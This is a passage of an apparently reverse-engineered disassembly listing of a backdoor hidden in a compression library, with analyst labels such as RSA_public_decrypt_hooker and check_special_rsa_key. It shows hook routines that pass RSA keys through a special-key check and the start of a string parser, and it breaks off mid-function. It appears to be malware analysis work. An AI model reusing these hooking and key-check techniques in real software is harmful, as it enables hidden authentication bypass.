.text.lzma_index_stream_siza:000000000000A237                 mov     dword ptr [r13+18h], 1
.text.lzma_index_stream_siza:000000000000A23F
.text.lzma_index_stream_siza:000000000000A23F loc_A23F:                               ; CODE XREF: check_special_rsa_key+33↑j
.text.lzma_index_stream_siza:000000000000A23F                 cmp     [rsp+5F8h+var_5F0], 0
.text.lzma_index_stream_siza:000000000000A245                 jnz     loc_A14A
.text.lzma_index_stream_siza:000000000000A24B                 jmp     loc_A155
.text.lzma_index_stream_siza:000000000000A250 ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:000000000000A250
.text.lzma_index_stream_siza:000000000000A250 loc_A250:                               ; CODE XREF: check_special_rsa_key+5F1↑j
.text.lzma_index_stream_siza:000000000000A250                 mov     r12d, 87h
.text.lzma_index_stream_siza:000000000000A256                 jmp     loc_9AD2
.text.lzma_index_stream_siza:000000000000A25B ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:000000000000A25B
.text.lzma_index_stream_siza:000000000000A25B loc_A25B:                               ; CODE XREF: check_special_rsa_key+C87↑j
.text.lzma_index_stream_siza:000000000000A25B                                         ; check_special_rsa_key+D18↑j
.text.lzma_index_stream_siza:000000000000A25B                 add     rsp, 5C8h
.text.lzma_index_stream_siza:000000000000A262                 pop     rbx
.text.lzma_index_stream_siza:000000000000A263                 pop     rbp
.text.lzma_index_stream_siza:000000000000A264                 pop     r12
.text.lzma_index_stream_siza:000000000000A266                 pop     r13
.text.lzma_index_stream_siza:000000000000A268                 pop     r14
.text.lzma_index_stream_siza:000000000000A26A                 pop     r15
.text.lzma_index_stream_siza:000000000000A26C                 retn
.text.lzma_index_stream_siza:000000000000A26C check_special_rsa_key endp
.text.lzma_index_stream_siza:000000000000A26C
.text.lzma_index_stream_siza:000000000000A26C _text_lzma_index_stream_siza ends
.text.lzma_index_stream_siza:000000000000A26C
.text.lzma_index_prealloa:000000000000A270 ; ===========================================================================
.text.lzma_index_prealloa:000000000000A270
.text.lzma_index_prealloa:000000000000A270 ; Segment type: Pure code
.text.lzma_index_prealloa:000000000000A270 ; Segment permissions: Read/Execute
.text.lzma_index_prealloa:000000000000A270 _text_lzma_index_prealloa segment para public 'CODE' use64
.text.lzma_index_prealloa:000000000000A270                 assume cs:_text_lzma_index_prealloa
.text.lzma_index_prealloa:000000000000A270                 ;org 0A270h
.text.lzma_index_prealloa:000000000000A270                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_index_prealloa:000000000000A270
.text.lzma_index_prealloa:000000000000A270 ; =============== S U B R O U T I N E =======================================
.text.lzma_index_prealloa:000000000000A270
.text.lzma_index_prealloa:000000000000A270
.text.lzma_index_prealloa:000000000000A270 ; __int64 __fastcall Llzma_index_prealloc_0(unsigned int, __int64, __int64, __int64)
.text.lzma_index_prealloa:000000000000A270 _Llzma_index_prealloc_0 proc near       ; DATA XREF: backdoor_vtbl_init+35↑o
.text.lzma_index_prealloa:000000000000A270
.text.lzma_index_prealloa:000000000000A270 var_48          = qword ptr -48h
.text.lzma_index_prealloa:000000000000A270 var_3C          = dword ptr -3Ch
.text.lzma_index_prealloa:000000000000A270 var_2C          = dword ptr -2Ch
.text.lzma_index_prealloa:000000000000A270
.text.lzma_index_prealloa:000000000000A270                 endbr64
.text.lzma_index_prealloa:000000000000A274                 push    r14
.text.lzma_index_prealloa:000000000000A276                 push    r13
.text.lzma_index_prealloa:000000000000A278                 push    r12
.text.lzma_index_prealloa:000000000000A27A                 mov     r12, rsi
.text.lzma_index_prealloa:000000000000A27D                 push    rbp
.text.lzma_index_prealloa:000000000000A27E                 sub     rsp, 28h
.text.lzma_index_prealloa:000000000000A282                 mov     rsi, cs:global_ctx
.text.lzma_index_prealloa:000000000000A289                 test    rsi, rsi
.text.lzma_index_prealloa:000000000000A28C                 jz      short loc_A2EF
.text.lzma_index_prealloa:000000000000A28E                 mov     rax, [rsi+8]
.text.lzma_index_prealloa:000000000000A292                 test    rax, rax
.text.lzma_index_prealloa:000000000000A295                 jz      short loc_A2EF
.text.lzma_index_prealloa:000000000000A297                 mov     r14, [rax]
.text.lzma_index_prealloa:000000000000A29A                 test    r14, r14
.text.lzma_index_prealloa:000000000000A29D                 jz      short loc_A2EF
.text.lzma_index_prealloa:000000000000A29F                 mov     ebp, edi
.text.lzma_index_prealloa:000000000000A2A1                 mov     r13, rdx
.text.lzma_index_prealloa:000000000000A2A4                 test    rcx, rcx
.text.lzma_index_prealloa:000000000000A2A7                 jz      short loc_A2D7
.text.lzma_index_prealloa:000000000000A2A9                 mov     rdi, rcx
.text.lzma_index_prealloa:000000000000A2AC                 lea     rdx, [rsp+48h+var_2C]
.text.lzma_index_prealloa:000000000000A2B1                 mov     [rsp+48h+var_48], rcx
.text.lzma_index_prealloa:000000000000A2B5                 mov     [rsp+48h+var_3C], r8d
.text.lzma_index_prealloa:000000000000A2BA                 mov     [rsp+48h+var_2C], 1
.text.lzma_index_prealloa:000000000000A2C2                 call    check_special_rsa_key ; PIC mode
.text.lzma_index_prealloa:000000000000A2C7                 cmp     [rsp+48h+var_2C], 0
.text.lzma_index_prealloa:000000000000A2CC                 mov     rcx, [rsp+48h+var_48]
.text.lzma_index_prealloa:000000000000A2D0                 mov     r8d, [rsp+48h+var_3C]
.text.lzma_index_prealloa:000000000000A2D5                 jz      short loc_A2F1
.text.lzma_index_prealloa:000000000000A2D7
.text.lzma_index_prealloa:000000000000A2D7 loc_A2D7:                               ; CODE XREF: _Llzma_index_prealloc_0+37↑j
.text.lzma_index_prealloa:000000000000A2D7                 add     rsp, 28h
.text.lzma_index_prealloa:000000000000A2DB                 mov     rdx, r13
.text.lzma_index_prealloa:000000000000A2DE                 mov     rsi, r12
.text.lzma_index_prealloa:000000000000A2E1                 mov     edi, ebp
.text.lzma_index_prealloa:000000000000A2E3                 mov     rax, r14
.text.lzma_index_prealloa:000000000000A2E6                 pop     rbp
.text.lzma_index_prealloa:000000000000A2E7                 pop     r12
.text.lzma_index_prealloa:000000000000A2E9                 pop     r13
.text.lzma_index_prealloa:000000000000A2EB                 pop     r14
.text.lzma_index_prealloa:000000000000A2ED                 jmp     rax
.text.lzma_index_prealloa:000000000000A2EF ; ---------------------------------------------------------------------------
.text.lzma_index_prealloa:000000000000A2EF
.text.lzma_index_prealloa:000000000000A2EF loc_A2EF:                               ; CODE XREF: _Llzma_index_prealloc_0+1C↑j
.text.lzma_index_prealloa:000000000000A2EF                                         ; _Llzma_index_prealloc_0+25↑j ...
.text.lzma_index_prealloa:000000000000A2EF                 xor     eax, eax
.text.lzma_index_prealloa:000000000000A2F1
.text.lzma_index_prealloa:000000000000A2F1 loc_A2F1:                               ; CODE XREF: _Llzma_index_prealloc_0+65↑j
.text.lzma_index_prealloa:000000000000A2F1                 add     rsp, 28h
.text.lzma_index_prealloa:000000000000A2F5                 pop     rbp
.text.lzma_index_prealloa:000000000000A2F6                 pop     r12
.text.lzma_index_prealloa:000000000000A2F8                 pop     r13
.text.lzma_index_prealloa:000000000000A2FA                 pop     r14
.text.lzma_index_prealloa:000000000000A2FC                 retn
.text.lzma_index_prealloa:000000000000A2FC _Llzma_index_prealloc_0 endp
.text.lzma_index_prealloa:000000000000A2FC
.text.lzma_index_prealloa:000000000000A2FC _text_lzma_index_prealloa ends
.text.lzma_index_prealloa:000000000000A2FC
.text.lzma_index_memusaga:000000000000A300 ; ===========================================================================
.text.lzma_index_memusaga:000000000000A300
.text.lzma_index_memusaga:000000000000A300 ; Segment type: Pure code
.text.lzma_index_memusaga:000000000000A300 ; Segment permissions: Read/Execute
.text.lzma_index_memusaga:000000000000A300 _text_lzma_index_memusaga segment para public 'CODE' use64
.text.lzma_index_memusaga:000000000000A300                 assume cs:_text_lzma_index_memusaga
.text.lzma_index_memusaga:000000000000A300                 ;org 0A300h
.text.lzma_index_memusaga:000000000000A300                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_index_memusaga:000000000000A300
.text.lzma_index_memusaga:000000000000A300 ; =============== S U B R O U T I N E =======================================
.text.lzma_index_memusaga:000000000000A300
.text.lzma_index_memusaga:000000000000A300
.text.lzma_index_memusaga:000000000000A300 ; __int64 __fastcall Llzma_index_memusage_part_0(__int64, __int64)
.text.lzma_index_memusaga:000000000000A300 _Llzma_index_memusage_part_0 proc near  ; DATA XREF: _Llzma_delta_props_decode_part_0+18↑o
.text.lzma_index_memusaga:000000000000A300                                         ; backdoor_init_stage2+44↑o
.text.lzma_index_memusaga:000000000000A300
.text.lzma_index_memusaga:000000000000A300 var_1C          = dword ptr -1Ch
.text.lzma_index_memusaga:000000000000A300
.text.lzma_index_memusaga:000000000000A300                 endbr64
.text.lzma_index_memusaga:000000000000A304                 push    r12
.text.lzma_index_memusaga:000000000000A306                 push    rbp
.text.lzma_index_memusaga:000000000000A307                 push    rbx
.text.lzma_index_memusaga:000000000000A308                 mov     rbx, rsi
.text.lzma_index_memusaga:000000000000A30B                 sub     rsp, 10h
.text.lzma_index_memusaga:000000000000A30F                 mov     rsi, cs:global_ctx
.text.lzma_index_memusaga:000000000000A316                 test    rsi, rsi
.text.lzma_index_memusaga:000000000000A319                 jz      short loc_A355
.text.lzma_index_memusaga:000000000000A31B                 mov     rax, [rsi+8]
.text.lzma_index_memusaga:000000000000A31F                 test    rax, rax
.text.lzma_index_memusaga:000000000000A322                 jz      short loc_A355
.text.lzma_index_memusaga:000000000000A324                 mov     r12, [rax+8]
.text.lzma_index_memusaga:000000000000A328                 test    r12, r12
.text.lzma_index_memusaga:000000000000A32B                 jz      short loc_A355
.text.lzma_index_memusaga:000000000000A32D                 mov     rbp, rdi
.text.lzma_index_memusaga:000000000000A330                 test    rbx, rbx
.text.lzma_index_memusaga:000000000000A333                 jz      short loc_A342
.text.lzma_index_memusaga:000000000000A335                 lea     rdx, [rsp+28h+var_1C]
.text.lzma_index_memusaga:000000000000A33A                 mov     rdi, rbx
.text.lzma_index_memusaga:000000000000A33D                 call    check_special_rsa_key ; PIC mode
.text.lzma_index_memusaga:000000000000A342
.text.lzma_index_memusaga:000000000000A342 loc_A342:                               ; CODE XREF: _Llzma_index_memusage_part_0+33↑j
.text.lzma_index_memusaga:000000000000A342                 add     rsp, 10h
.text.lzma_index_memusaga:000000000000A346                 mov     rsi, rbx
.text.lzma_index_memusaga:000000000000A349                 mov     rdi, rbp
.text.lzma_index_memusaga:000000000000A34C                 mov     rax, r12
.text.lzma_index_memusaga:000000000000A34F                 pop     rbx
.text.lzma_index_memusaga:000000000000A350                 pop     rbp
.text.lzma_index_memusaga:000000000000A351                 pop     r12
.text.lzma_index_memusaga:000000000000A353                 jmp     rax
.text.lzma_index_memusaga:000000000000A355 ; ---------------------------------------------------------------------------
.text.lzma_index_memusaga:000000000000A355
.text.lzma_index_memusaga:000000000000A355 loc_A355:                               ; CODE XREF: _Llzma_index_memusage_part_0+19↑j
.text.lzma_index_memusaga:000000000000A355                                         ; _Llzma_index_memusage_part_0+22↑j ...
.text.lzma_index_memusaga:000000000000A355                 add     rsp, 10h
.text.lzma_index_memusaga:000000000000A359                 xor     eax, eax
.text.lzma_index_memusaga:000000000000A35B                 pop     rbx
.text.lzma_index_memusaga:000000000000A35C                 pop     rbp
.text.lzma_index_memusaga:000000000000A35D                 pop     r12
.text.lzma_index_memusaga:000000000000A35F                 retn
.text.lzma_index_memusaga:000000000000A35F _Llzma_index_memusage_part_0 endp
.text.lzma_index_memusaga:000000000000A35F
.text.lzma_index_memusaga:000000000000A35F _text_lzma_index_memusaga ends
.text.lzma_index_memusaga:000000000000A35F
.text.lzma_index_inia:000000000000A360 ; ===========================================================================
.text.lzma_index_inia:000000000000A360
.text.lzma_index_inia:000000000000A360 ; Segment type: Pure code
.text.lzma_index_inia:000000000000A360 ; Segment permissions: Read/Execute
.text.lzma_index_inia:000000000000A360 _text_lzma_index_inia segment para public 'CODE' use64
.text.lzma_index_inia:000000000000A360                 assume cs:_text_lzma_index_inia
.text.lzma_index_inia:000000000000A360                 ;org 0A360h
.text.lzma_index_inia:000000000000A360                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_index_inia:000000000000A360
.text.lzma_index_inia:000000000000A360 ; =============== S U B R O U T I N E =======================================
.text.lzma_index_inia:000000000000A360
.text.lzma_index_inia:000000000000A360
.text.lzma_index_inia:000000000000A360 ; void __fastcall RSA_public_decrypt_hooker(__int64, __int64, __int64)
.text.lzma_index_inia:000000000000A360                 public RSA_public_decrypt_hooker
.text.lzma_index_inia:000000000000A360 RSA_public_decrypt_hooker proc near     ; DATA XREF: backdoor_vtbl_init+40↑o
.text.lzma_index_inia:000000000000A360
.text.lzma_index_inia:000000000000A360 var_38          = qword ptr -38h
.text.lzma_index_inia:000000000000A360 var_30          = qword ptr -30h
.text.lzma_index_inia:000000000000A360 var_1C          = dword ptr -1Ch
.text.lzma_index_inia:000000000000A360
.text.lzma_index_inia:000000000000A360                 endbr64
.text.lzma_index_inia:000000000000A364                 push    r14
.text.lzma_index_inia:000000000000A366                 push    r12
.text.lzma_index_inia:000000000000A368                 push    rbp
.text.lzma_index_inia:000000000000A369                 mov     rbp, rsi
.text.lzma_index_inia:000000000000A36C                 sub     rsp, 20h
.text.lzma_index_inia:000000000000A370                 mov     rsi, cs:global_ctx
.text.lzma_index_inia:000000000000A377                 test    rsi, rsi
.text.lzma_index_inia:000000000000A37A                 jz      short loc_A3C6
.text.lzma_index_inia:000000000000A37C                 mov     rax, [rsi+8]
.text.lzma_index_inia:000000000000A380                 test    rax, rax
.text.lzma_index_inia:000000000000A383                 jz      short loc_A3C6
.text.lzma_index_inia:000000000000A385                 mov     r14, [rax+10h]
.text.lzma_index_inia:000000000000A389                 test    r14, r14
.text.lzma_index_inia:000000000000A38C                 jz      short loc_A3C6
.text.lzma_index_inia:000000000000A38E                 mov     r12, rdx
.text.lzma_index_inia:000000000000A391                 test    rdi, rdi
.text.lzma_index_inia:000000000000A394                 jz      short loc_A3B2
.text.lzma_index_inia:000000000000A396                 lea     rdx, [rsp+38h+var_1C]
.text.lzma_index_inia:000000000000A39B                 mov     [rsp+38h+var_30], rcx
.text.lzma_index_inia:000000000000A3A0                 mov     [rsp+38h+var_38], rdi
.text.lzma_index_inia:000000000000A3A4                 call    check_special_rsa_key ; PIC mode
.text.lzma_index_inia:000000000000A3A9                 mov     rcx, [rsp+38h+var_30]
.text.lzma_index_inia:000000000000A3AE                 mov     rdi, [rsp+38h+var_38]
.text.lzma_index_inia:000000000000A3B2
.text.lzma_index_inia:000000000000A3B2 loc_A3B2:                               ; CODE XREF: RSA_public_decrypt_hooker+34↑j
.text.lzma_index_inia:000000000000A3B2                 add     rsp, 20h
.text.lzma_index_inia:000000000000A3B6                 mov     rdx, r12
.text.lzma_index_inia:000000000000A3B9                 mov     rsi, rbp
.text.lzma_index_inia:000000000000A3BC                 mov     rax, r14
.text.lzma_index_inia:000000000000A3BF                 pop     rbp
.text.lzma_index_inia:000000000000A3C0                 pop     r12
.text.lzma_index_inia:000000000000A3C2                 pop     r14
.text.lzma_index_inia:000000000000A3C4                 jmp     rax
.text.lzma_index_inia:000000000000A3C6 ; ---------------------------------------------------------------------------
.text.lzma_index_inia:000000000000A3C6
.text.lzma_index_inia:000000000000A3C6 loc_A3C6:                               ; CODE XREF: RSA_public_decrypt_hooker+1A↑j
.text.lzma_index_inia:000000000000A3C6                                         ; RSA_public_decrypt_hooker+23↑j ...
.text.lzma_index_inia:000000000000A3C6                 add     rsp, 20h
.text.lzma_index_inia:000000000000A3CA                 pop     rbp
.text.lzma_index_inia:000000000000A3CB                 pop     r12
.text.lzma_index_inia:000000000000A3CD                 pop     r14
.text.lzma_index_inia:000000000000A3CF                 retn
.text.lzma_index_inia:000000000000A3CF RSA_public_decrypt_hooker endp
.text.lzma_index_inia:000000000000A3CF
.text.lzma_index_inia:000000000000A3CF _text_lzma_index_inia ends
.text.lzma_index_inia:000000000000A3CF
.text.parse_lzma12z:000000000000A3D0 ; ===========================================================================
.text.parse_lzma12z:000000000000A3D0
.text.parse_lzma12z:000000000000A3D0 ; Segment type: Pure code
.text.parse_lzma12z:000000000000A3D0 ; Segment permissions: Read/Execute
.text.parse_lzma12z:000000000000A3D0 _text_parse_lzma12z segment para public 'CODE' use64
.text.parse_lzma12z:000000000000A3D0                 assume cs:_text_parse_lzma12z
.text.parse_lzma12z:000000000000A3D0                 ;org 0A3D0h
.text.parse_lzma12z:000000000000A3D0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.parse_lzma12z:000000000000A3D0
.text.parse_lzma12z:000000000000A3D0 ; =============== S U B R O U T I N E =======================================
.text.parse_lzma12z:000000000000A3D0
.text.parse_lzma12z:000000000000A3D0
.text.parse_lzma12z:000000000000A3D0 ; __int64 __fastcall Llzma12_mode_map_part_1(int, __int64, char *str)
.text.parse_lzma12z:000000000000A3D0 _Llzma12_mode_map_part_1 proc near      ; DATA XREF: backdoor_vtbl_init+4B↑o
.text.parse_lzma12z:000000000000A3D0
.text.parse_lzma12z:000000000000A3D0 var_450         = qword ptr -450h
.text.parse_lzma12z:000000000000A3D0 var_448         = qword ptr -448h
.text.parse_lzma12z:000000000000A3D0 var_440         = qword ptr -440h
.text.parse_lzma12z:000000000000A3D0 var_438         = xmmword ptr -438h
.text.parse_lzma12z:000000000000A3D0 var_428         = byte ptr -428h
.text.parse_lzma12z:000000000000A3D0 var_338         = xmmword ptr -338h
.text.parse_lzma12z:000000000000A3D0 var_328         = byte ptr -328h
.text.parse_lzma12z:000000000000A3D0 var_238         = xmmword ptr -238h
.text.parse_lzma12z:000000000000A3D0 var_228         = byte ptr -228h
.text.parse_lzma12z:000000000000A3D0 var_223         = byte ptr -223h
.text.parse_lzma12z:000000000000A3D0 var_215         = byte ptr -215h
.text.parse_lzma12z:000000000000A3D0 var_214         = byte ptr -214h
.text.parse_lzma12z:000000000000A3D0 var_210         = byte ptr -210h
.text.parse_lzma12z:000000000000A3D0 var_20F         = byte ptr -20Fh
.text.parse_lzma12z:000000000000A3D0 var_20E         = byte ptr -20Eh
.text.parse_lzma12z:000000000000A3D0 var_20D         = byte ptr -20Dh
.text.parse_lzma12z:000000000000A3D0 var_20C         = byte ptr -20Ch
.text.parse_lzma12z:000000000000A3D0 var_20B         = byte ptr -20Bh
.text.parse_lzma12z:000000000000A3D0 var_20A         = word ptr -20Ah
.text.parse_lzma12z:000000000000A3D0 var_208         = byte ptr -208h
.text.parse_lzma12z:000000000000A3D0 var_201         = byte ptr -201h
.text.parse_lzma12z:000000000000A3D0
.text.parse_lzma12z:000000000000A3D0                 endbr64
.text.parse_lzma12z:000000000000A3D4                 push    r15
.text.parse_lzma12z:000000000000A3D6                 xor     eax, eax
.text.parse_lzma12z:000000000000A3D8                 mov     ecx, 3Ch ; '<'
.text.parse_lzma12z:000000000000A3DD                 xorps   xmm0, xmm0
.text.parse_lzma12z:000000000000A3E0                 push    r14
.text.parse_lzma12z:000000000000A3E2                 mov     r14d, edi
.text.parse_lzma12z:000000000000A3E5                 push    r13
.text.parse_lzma12z:000000000000A3E7                 push    r12
.text.parse_lzma12z:000000000000A3E9                 push    rbp
.text.parse_lzma12z:000000000000A3EA                 mov     rbp, rdx
.text.parse_lzma12z:000000000000A3ED                 push    rbx
.text.parse_lzma12z:000000000000A3EE                 sub     rsp, 428h
.text.parse_lzma12z:000000000000A3F5                 mov     rdx, cs:global_ctx
.text.parse_lzma12z:000000000000A3FC                 lea     rdi, [rsp+458h+var_428]
.text.parse_lzma12z:000000000000A401                 mov     rbx, [rdx+30h]
.text.parse_lzma12z:000000000000A405                 mov     r13, [rdx+10h]
.text.parse_lzma12z:000000000000A409                 movups  [rsp+458h+var_438], xmm0
.text.parse_lzma12z:000000000000A40E                 rep stosd
.text.parse_lzma12z:000000000000A410                 lea     rdi, [rsp+458h+var_328]
.text.parse_lzma12z:000000000000A418                 mov     ecx, 3Ch ; '<'
.text.parse_lzma12z:000000000000A41D                 movups  [rsp+458h+var_338], xmm0
.text.parse_lzma12z:000000000000A425                 rep stosd
.text.parse_lzma12z:000000000000A427                 lea     rdi, [rsp+458h+var_228]
.text.parse_lzma12z:000000000000A42F                 mov     ecx, 7Ch ; '|'
.text.parse_lzma12z:000000000000A434                 movups  [rsp+458h+var_238], xmm0
.text.parse_lzma12z:000000000000A43C                 rep stosd
.text.parse_lzma12z:000000000000A43E                 test    rbp, rbp
.text.parse_lzma12z:000000000000A441                 jz      loc_A70A
.text.parse_lzma12z:000000000000A447                 cmp     dword ptr [rbx], 1
.text.parse_lzma12z:000000000000A44A                 jz      loc_A710
.text.parse_lzma12z:000000000000A450                 cmp     dword ptr [rdx+90h], 0
.text.parse_lzma12z:000000000000A457                 jnz     loc_A710
.text.parse_lzma12z:000000000000A45D                 cmp     qword ptr [rbx+48h], 0
.text.parse_lzma12z:000000000000A462                 jz      short loc_A46F
.text.parse_lzma12z:000000000000A464                 cmp     qword ptr [rbx+50h], 0
.text.parse_lzma12z:000000000000A469                 jz      loc_A710
.text.parse_lzma12z:000000000000A46F
.text.parse_lzma12z:000000000000A46F loc_A46F:                               ; CODE XREF: _Llzma12_mode_map_part_1+92↑j
.text.parse_lzma12z:000000000000A46F                 mov     rdi, rbp
.text.parse_lzma12z:000000000000A472                 call    strlen
.text.parse_lzma12z:000000000000A477                 lea     r12, [rbp+rax+0]
.text.parse_lzma12z:000000000000A47C
.text.parse_lzma12z:000000000000A47C loc_A47C:                               ; CODE XREF: _Llzma12_mode_map_part_1+335↓j
.text.parse_lzma12z:000000000000A47C                 cmp     rbp, r12
.text.parse_lzma12z:000000000000A47F                 jnb     loc_A710
.text.parse_lzma12z:000000000000A485                 mov     rsi, r12        ; unsigned __int64
.text.parse_lzma12z:000000000000A488                 mov     rdi, rbp        ; _BYTE *
.text.parse_lzma12z:000000000000A48B                 call    table_get       ; PIC mode
.text.parse_lzma12z:000000000000A490                 cmp     eax, 790h
.text.parse_lzma12z:000000000000A495                 jnz     short loc_A500
.text.parse_lzma12z:000000000000A497                 mov     rax, [rbx+10h]
.text.parse_lzma12z:000000000000A49B                 test    r13, r13
.text.parse_lzma12z:000000000000A49E                 setnz   r12b
.text.parse_lzma12z:000000000000A4A2                 cmp     dword ptr [rbx+8], 0
.text.parse_lzma12z:000000000000A4A6                 mov     dl, [rax]
.text.parse_lzma12z:000000000000A4A8                 mov     al, [rax+1]
.text.parse_lzma12z:000000000000A4AB                 mov     byte ptr [rsp+458h+var_238], dl
.text.parse_lzma12z:000000000000A4B2                 mov     byte ptr [rsp+458h+var_238+1], al
.text.parse_lzma12z:000000000000A4B9                 mov     dword ptr [rbx], 1
.text.parse_lzma12z:000000000000A4BF                 jz      short loc_A4D6
.text.parse_lzma12z:000000000000A4C1                 test    r12b, r12b
.text.parse_lzma12z:000000000000A4C4                 jz      short loc_A4D6
.text.parse_lzma12z:000000000000A4C6                 mov     rax, [r13+58h]
.text.parse_lzma12z:000000000000A4CA                 test    rax, rax
.text.parse_lzma12z:000000000000A4CD                 jz      short loc_A4D6
.text.parse_lzma12z:000000000000A4CF                 mov     edi, 0FFh
.text.parse_lzma12z:000000000000A4D4                 call    rax
.text.parse_lzma12z:000000000000A4D6
.text.parse_lzma12z:000000000000A4D6 loc_A4D6:                               ; CODE XREF: _Llzma12_mode_map_part_1+EF↑j
.text.parse_lzma12z:000000000000A4D6                                         ; _Llzma12_mode_map_part_1+F4↑j ...
.text.parse_lzma12z:000000000000A4D6                 xor     eax, eax
.text.parse_lzma12z:000000000000A4D8                 lea     rdx, [rsp+458h+var_238]
.text.parse_lzma12z:000000000000A4E0                 mov     rcx, rbp
.text.parse_lzma12z:000000000000A4E3                 mov     esi, r14d
.text.parse_lzma12z:000000000000A4E6                 mov     rdi, rbx
.text.parse_lzma12z:000000000000A4E9                 call    sub_7430
.text.parse_lzma12z:000000000000A4EE                 cmp     dword ptr [rbx+8], 0
.text.parse_lzma12z:000000000000A4F2                 jz      loc_A710
.text.parse_lzma12z:000000000000A4F8                 test    r12b, r12b
.text.parse_lzma12z:000000000000A4FB                 jmp     loc_A6EE
.text.parse_lzma12z:000000000000A500 ; ---------------------------------------------------------------------------
.text.parse_lzma12z:000000000000A500
.text.parse_lzma12z:000000000000A500 loc_A500:                               ; CODE XREF: _Llzma12_mode_map_part_1+C5↑j
.text.parse_lzma12z:000000000000A500                 cmp     eax, 870h
.text.parse_lzma12z:000000000000A505                 jz      short loc_A512
.text.parse_lzma12z:000000000000A507                 cmp     eax, 1A0h
.text.parse_lzma12z:000000000000A50C                 jnz     loc_A702
.text.parse_lzma12z:000000000000A512
.text.parse_lzma12z:000000000000A512 loc_A512:                               ; CODE XREF: _Llzma12_mode_map_part_1+135↑j
.text.parse_lzma12z:000000000000A512                 lea     r9, [rbp+17h]
.text.parse_lzma12z:000000000000A516                 cmp     eax, 870h
.text.parse_lzma12z:000000000000A51B                 jnz     short loc_A521
.text.parse_lzma12z:000000000000A51D                 lea     r9, [rbp+16h]
.text.parse_lzma12z:000000000000A521
.text.parse_lzma12z:000000000000A521 loc_A521:                               ; CODE XREF: _Llzma12_mode_map_part_1+14B↑j
.text.parse_lzma12z:000000000000A521                 lea     rax, [rsp+458h+var_438]
.text.parse_lzma12z:000000000000A526                 xor     r14d, r14d
.text.parse_lzma12z:000000000000A529                 xor     r8d, r8d
.text.parse_lzma12z:000000000000A52C                 xor     r15d, r15d
.text.parse_lzma12z:000000000000A52F                 mov     [rsp+458h+var_450], rax
.text.parse_lzma12z:000000000000A534
.text.parse_lzma12z:000000000000A534 loc_A534:                               ; CODE XREF: _Llzma12_mode_map_part_1+1E8↓j
.text.parse_lzma12z:000000000000A534                 mov     rsi, r12        ; unsigned __int64
.text.parse_lzma12z:000000000000A537                 mov     rdi, rbp        ; _BYTE *
.text.parse_lzma12z:000000000000A53A                 mov     [rsp+458h+var_440], r8
.text.parse_lzma12z:000000000000A53F                 mov     [rsp+458h+var_448], r9
.text.parse_lzma12z:000000000000A544                 call    table_get       ; PIC mode
.text.parse_lzma12z:000000000000A549                 mov     r9, [rsp+458h+var_448]
.text.parse_lzma12z:000000000000A54E                 mov     r8, [rsp+458h+var_440]
.text.parse_lzma12z:000000000000A553                 cmp     eax, 678h
.text.parse_lzma12z:000000000000A558                 jz      short loc_A58D
.text.parse_lzma12z:000000000000A55A                 cmp     eax, 810h
.text.parse_lzma12z:000000000000A55F                 jnz     short loc_A5B2
.text.parse_lzma12z:000000000000A561                 mov     r15, rbp
.text.parse_lzma12z:000000000000A564                 sub     r15, r9
.text.parse_lzma12z:000000000000A567                 cmp     r15, 0FFh
.text.parse_lzma12z:000000000000A56E                 ja      loc_A70A
.text.parse_lzma12z:000000000000A574                 lea     rax, [rsp+458h+var_338]
.text.parse_lzma12z:000000000000A57C                 mov     rsi, r9
.text.parse_lzma12z:000000000000A57F                 lea     r8, [rbp+6]
.text.parse_lzma12z:000000000000A583                 mov     rcx, r15
.text.parse_lzma12z:000000000000A586                 mov     rdi, rax
.text.parse_lzma12z:000000000000A589                 rep movsb
.text.parse_lzma12z:000000000000A58B                 jmp     short loc_A5B2
.text.parse_lzma12z:000000000000A58D ; ---------------------------------------------------------------------------
.text.parse_lzma12z:000000000000A58D
.text.parse_lzma12z:000000000000A58D loc_A58D:                               ; CODE XREF: _Llzma12_mode_map_part_1+188↑j
.text.parse_lzma12z:000000000000A58D                 test    r8, r8
.text.parse_lzma12z:000000000000A590                 jz      short loc_A5B2
.text.parse_lzma12z:000000000000A592                 mov     r14, rbp
.text.parse_lzma12z:000000000000A595                 sub     r14, r8
.text.parse_lzma12z:000000000000A598                 cmp     r14, 0FFh
.text.parse_lzma12z:000000000000A59F                 ja      loc_A70A
.text.parse_lzma12z:000000000000A5A5                 mov     rdi, [rsp+458h+var_450]
.text.parse_lzma12z:000000000000A5AA                 mov     rsi, r8
.text.parse_lzma12z:000000000000A5AD                 mov     rcx, r14
.text.parse_lzma12z:000000000000A5B0                 rep movsb
.text.parse_lzma12z:000000000000A5B2
.text.parse_lzma12z:000000000000A5B2 loc_A5B2:                               ; CODE XREF: _Llzma12_mode_map_part_1+18F↑j
.text.parse_lzma12z:000000000000A5B2                                         ; _Llzma12_mode_map_part_1+1BB↑j ...
.text.parse_lzma12z:000000000000A5B2                 inc     rbp
.text.parse_lzma12z:000000000000A5B5                 cmp     rbp, r12
.text.parse_lzma12z:000000000000A5B8                 jb      loc_A534
.text.parse_lzma12z:000000000000A5BE                 test    r15, r15
.text.parse_lzma12z:000000000000A5C1                 jz      loc_A70A
.text.parse_lzma12z:000000000000A5C7                 test    r14, r14
.text.parse_lzma12z:000000000000A5CA                 jz      loc_A70A
.text.parse_lzma12z:000000000000A5D0                 mov     rcx, [rbx+18h]
.text.parse_lzma12z:000000000000A5D4                 xor     eax, eax
.text.parse_lzma12z:000000000000A5D6                 lea     r12, [rsp+458h+var_238]
.text.parse_lzma12z:000000000000A5DE
.text.parse_lzma12z:000000000000A5DE loc_A5DE:                               ; CODE XREF: _Llzma12_mode_map_part_1+21D↓j
.text.parse_lzma12z:000000000000A5DE                 mov     dl, [rcx+rax]
.text.parse_lzma12z:000000000000A5E1                 inc     rax
.text.parse_lzma12z:000000000000A5E4                 mov     [rax+r12-1], dl
.text.parse_lzma12z:000000000000A5E9                 cmp     rax, 15h
.text.parse_lzma12z:000000000000A5ED                 jnz     short loc_A5DE
.text.parse_lzma12z:000000000000A5EF                 mov     rsi, [rbx+28h]
.text.parse_lzma12z:000000000000A5F3                 xor     eax, eax
.text.parse_lzma12z:000000000000A5F5                 lea     rdx, [rsp+458h+var_223]
.text.parse_lzma12z:000000000000A5FD
